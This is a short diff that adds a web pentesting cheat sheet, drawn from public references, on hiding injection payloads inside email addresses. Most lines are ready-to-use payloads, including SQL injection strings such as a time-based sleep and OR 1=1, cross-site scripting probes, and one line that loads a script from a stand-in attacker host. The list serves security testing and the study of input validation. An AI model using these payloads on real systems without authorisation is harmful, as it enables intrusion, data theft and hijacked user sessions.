@@ -1,0 +1,22 @@
+# https://brutelogic.com.br/blog/xss-limited-input-formats/
+# https://book.hacktricks.xyz/pentesting-web/email-injections
+# 
+
+Useful Payloads in Email and Phone Number:
+
+The structure of valid addresses:
+"payload"@mail.local
+name@"payload"mail.local
+name(payload)@mail.local
+name@(payload)mail.local
+name@mail.local(payload)
+
+❗️Based on this format, we can generate different payloads for different types of vulnerabilities and try to exploit them.
+"'-sleep(5)-'"@mail.local.
+"'-alert(5)-'"@mail.local.
+"'--><script/src=//attacker.com></script>"@mail.local
+"<img/src/onerror=alert(5)>"@mail.local
+name(<script>alert(5)</script>)@mail.local
+name@mail(<script>alert(5)</script>).local
+"'OR 1=1 --'"@mail.local
+
